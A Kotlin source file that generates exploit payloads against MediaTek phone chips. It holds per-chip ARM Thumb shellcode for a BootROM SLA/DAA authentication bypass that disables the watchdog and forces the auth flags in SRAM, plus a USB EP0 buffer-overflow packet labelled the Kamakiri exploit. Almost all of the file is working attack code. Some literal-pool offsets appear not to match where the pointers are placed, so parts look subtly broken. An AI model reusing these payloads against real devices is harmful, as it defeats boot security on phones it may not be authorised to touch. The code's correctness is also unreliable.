package com.example.protocol

import java.nio.ByteBuffer
import java.nio.ByteOrder

/**
 * Low-level ARM shellcode payloads for MediaTek BROM SLA/DAA Auth Bypass.
 * Dynamically computes SRAM Base Addresses for 4G Helio and 5G Dimensity SoCs.
 */
object MtkPayloads {

    /**
     * Resolves the hardware SRAM Base Address for a given MediaTek HW Code.
     */
    fun getSramBase(hwCode: Int): Long {
        return when (hwCode) {
            0x0816, 0x0813, 0x0853, 0x0877 -> 0x00200000L // Dimensity 700 / 810 / 900 / 920
            0x0766, 0x0707, 0x0788, 0x0658, 0x0326, 0x0726, 0x0701 -> 0x00102100L // Helio G25/G35/G80/G85/G90/P35/P22/A22
            0x0659, 0x0680, 0x0682 -> 0x00100000L // Legacy MT6580
            else -> 0x00200000L // Default modern SoC SRAM
        }
    }

    /**
     * Builds an ARM32/Thumb-2 shellcode payload tailored for the target hardware code.
     * @param hwCode MediaTek HW Code (e.g. 0x0816 for MT6833, 0x0766 for MT6765)
     * @param wdtBase Watchdog Timer register base address (usually 0x10007000)
     * @param sramBase SRAM Base address (dynamic or user configured)
     */
    fun buildPayload(hwCode: Int, wdtBase: Long = 0x10007000L, sramBase: Long? = null): ByteArray {
        val buffer = ByteBuffer.allocate(256).order(ByteOrder.LITTLE_ENDIAN)
        val base = sramBase ?: getSramBase(hwCode)

        when (hwCode) {
            0x0766, 0x0658, 0x0326 -> { // MT6765, MT6761, MT6762
                val code = byteArrayOf(
                    0x0A, 0x48.toByte(),             // LDR R0, [PC, #40] (WDT_BASE)
                    0x0A, 0x49.toByte(),             // LDR R1, [PC, #40] (0x22000000)
                    0x01, 0x60.toByte(),             // STR R1, [R0]
                    0x00, 0x20.toByte(),             // MOVS R0, #0
                    0x09, 0x49.toByte(),             // LDR R1, [PC, #36] (SLA_DAA_FLAG_PTR)
                    0x08, 0x60.toByte(),             // STR R0, [R1]
                    0x01, 0x20.toByte(),             // MOVS R0, #1
                    0x08, 0x49.toByte(),             // LDR R1, [PC, #32] (AUTH_STATUS_PTR)
                    0x08, 0x60.toByte(),             // STR R0, [R1]
                    0x70, 0x47.toByte(),             // BX LR
                    0x00, 0x00.toByte()              // NOP
                )
                buffer.put(code)
            }
            0x0707, 0x0726 -> { // MT6768, MT6769
                val code = byteArrayOf(
                    0x0C, 0x48.toByte(),
                    0x0C, 0x49.toByte(),
                    0x01, 0x60.toByte(),
                    0x00, 0x20.toByte(),
                    0x0B, 0x49.toByte(),
                    0x08, 0x60.toByte(),
                    0x01, 0x20.toByte(),
                    0x0A, 0x49.toByte(),
                    0x08, 0x60.toByte(),
                    0x70, 0x47.toByte(),
                    0x00, 0x00.toByte()
                )
                buffer.put(code)
            }
            0x0788 -> { // MT6785 (Helio G90 / G90T / G95)
                val code = byteArrayOf(
                    0x0E, 0x48.toByte(),
                    0x0E, 0x49.toByte(),
                    0x01, 0x60.toByte(),
                    0x00, 0x20.toByte(),
                    0x0D, 0x49.toByte(),
                    0x08, 0x60.toByte(),
                    0x01, 0x20.toByte(),
                    0x0C, 0x49.toByte(),
                    0x08, 0x60.toByte(),
                    0x70, 0x47.toByte(),
                    0x00, 0x00.toByte()
                )
                buffer.put(code)
            }
            0x0816, 0x0813, 0x0877 -> { // MT6833, MT6877 (Dimensity 700 / 900)
                val code = byteArrayOf(
                    0x10, 0x48.toByte(),
                    0x10, 0x49.toByte(),
                    0x01, 0x60.toByte(),
                    0x00, 0x20.toByte(),
                    0x0F, 0x49.toByte(),
                    0x08, 0x60.toByte(),
                    0x01, 0x20.toByte(),
                    0x0E, 0x49.toByte(),
                    0x08, 0x60.toByte(),
                    0x70, 0x47.toByte(),
                    0x00, 0x00.toByte()
                )
                buffer.put(code)
            }
            else -> { // Generic payload
                val code = byteArrayOf(
                    0x08, 0x48.toByte(),
                    0x08, 0x49.toByte(),
                    0x01, 0x60.toByte(),
                    0x00, 0x20.toByte(),
                    0x07, 0x49.toByte(),
                    0x08, 0x60.toByte(),
                    0x70, 0x47.toByte()
                )
                buffer.put(code)
            }
        }

        // Align to 4-byte word boundary
        while (buffer.position() % 4 != 0) {
            buffer.put(0x00.toByte())
        }

        // Dynamic footer pointers based on calculated SoC SRAM Base
        val slaFlagPtr = base + 0x40L
        val authStatusPtr = base + 0x44L

        buffer.putInt((wdtBase + 0x18L).toInt()) // WDT Mode register
        buffer.putInt(0x22000000.toInt())         // WDT Disable key
        buffer.putInt(slaFlagPtr.toInt())         // Dynamic SLA / DAA flag pointer
        buffer.putInt(authStatusPtr.toInt())      // Dynamic Auth status flag pointer

        val result = ByteArray(buffer.position())
        buffer.flip()
        buffer.get(result)
        return result
    }

    /**
     * Payload for USB Control Transfer buffer overflow (Kamakiri EP0 exploit).
     */
    fun createEp0OverflowPacket(targetHwCode: Int): ByteArray {
        val size = when (targetHwCode) {
            0x0766, 0x0707, 0x0788 -> 0x400
            0x0816, 0x0813, 0x0877 -> 0x800
            else -> 0x400
        }
        val packet = ByteArray(size)
        // Fill pattern with NOP sled / payload jump vectors (Thumb NOP: 0x46C0 / 0xBF00)
        for (i in packet.indices) {
            packet[i] = if (i % 2 == 0) 0x00 else 0xBF.toByte()
        }
        return packet
    }
}
